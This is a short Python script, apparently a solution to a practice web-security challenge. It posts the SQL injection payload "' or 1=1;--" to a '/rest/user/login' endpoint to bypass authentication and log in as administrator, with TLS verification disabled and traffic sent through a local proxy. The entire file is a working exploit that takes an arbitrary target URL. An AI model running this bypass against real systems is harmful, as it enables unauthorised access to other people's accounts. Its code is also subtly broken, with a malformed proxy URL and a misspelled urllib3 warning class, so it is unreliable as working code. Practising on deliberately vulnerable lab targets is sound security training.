import requests
import sys
import urllib3
import json


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarnings)

proxies = {'http': 'http:127.0.0.1:8000', 'https': 'http://127.0.0.1:8000'}

def login_as_administrator(url):

    uri = "/rest/user/login"
    data = {'email': "' or 1=1;--", 'password': 10001}
    r = requests.post( url + uri, data = data, verify = False, proxies = proxies )
    if "authentication" in r.text:
        return True
    return False

def main():
    try :
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print("[-] Usage: %s www.example.com " % sys.argv[0])
        sys.exit(-1)

    if login_as_administrator(url):
        print("[+] Challange completed")
        sys.exit(0)

    print("[-] Sorry something went wrong")

if __name__ == "__main__":
    main()

